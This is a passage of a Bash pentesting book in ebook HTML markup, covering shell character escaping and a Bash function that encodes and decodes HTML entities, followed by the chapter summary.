    <span class="koboSpan" id="kobo.1027.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1028.1">
      '
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1029.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1030.1">
      "
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1031.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1032.1">
      &amp;
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1033.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1034.1">
      *
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1035.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1036.1">
      ?
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1037.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1038.1">
      (
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1039.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1040.1">
      )
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1041.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1042.1">
      {
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1043.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1044.1">
      }
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1045.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1046.1">
      [
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1047.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1048.1">
      ]
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1049.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1050.1">
      |
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1051.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1052.1">
      ;
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1053.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1054.1">
      &lt;
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1055.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1056.1">
      &gt;
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1057.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1058.1">
      !
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1059.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1060.1">
      #
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1061.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1062.1">
      ~
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1063.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1064.1">
      ^
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1065.1">
     .
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.1066.1">
     It is not necessary to escape them when the characters are used inside
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1067.1">
      single quotes.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1068.1">
     Here is an example of escaping
    </span>
    <a id="_idIndexMarker561">
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1069.1">
      these characters:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.1070.1">
$ echo 'hello&lt;script&gt;world' | html_encode
hello&amp;lt;script&amp;gt;world</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1071.1">
     Here’s the corresponding
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1072.1">
      decoding function:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.1073.1">
html_decode() {
  local input
  input=$(cat)
  input="${input//\&amp;apos;/\'}"
  input="${input//\&amp;quot;/\"}"
  input="${input//\&amp;gt;/\&gt;}"
  input="${input//\&amp;lt;/\&lt;}"
  input="${input//\&amp;amp;/\&amp;}"
  echo "$input"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1074.1">
     Here is an example of HTML
    </span>
    <a id="_idIndexMarker562">
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1075.1">
      decoding data:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.1076.1">
$ echo 'hello&amp;lt;script&amp;gt;world' | html_decode
hello&lt;script&gt;world</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1077.1">
     The section demonstrated how to use Bash to convert common data formats found in web application pentesting.
    </span>
    <span class="koboSpan" id="kobo.1077.2">
     Populate your
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1078.1">
      .bashrc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1079.1">
     file with these functions in advance, and you’ll be prepared to solve even the most advanced data manipulation tasks in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1080.1">
      your pentests.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-159">
    <a id="_idTextAnchor259">
    </a>
    <span class="koboSpan" id="kobo.1081.1">
     Summary
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.1082.1">
     You can’t always depend on having the ability to install tools or programming libraries in the testing environment.
    </span>
    <span class="koboSpan" id="kobo.1082.2">
     Bash scripting provides a way to use the built-in shell and tools to accomplish almost any task.
    </span>
    <span class="koboSpan" id="kobo.1082.3">
     In hindsight, there were many times in my career when I felt that I was hindered in my ability to accomplish a test without installing additional tools, or resorted to writing the tool in another language such as Python.
    </span>
    <span class="koboSpan" id="kobo.1082.4">
     This was due to my lack of knowledge of Bash scripting.
    </span>
    <span class="koboSpan" id="kobo.1082.5">
     Armed with this knowledge, you’re ready to tackle the most complex web application testing challenges
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1083.1">
      using Bash.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1084.1">
     In the next chapter, we’ll explore network and infrastructure pentesting
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1085.1">
      with Bash.
     </span>
    </span>
   </p>
  </div>
 </body></html>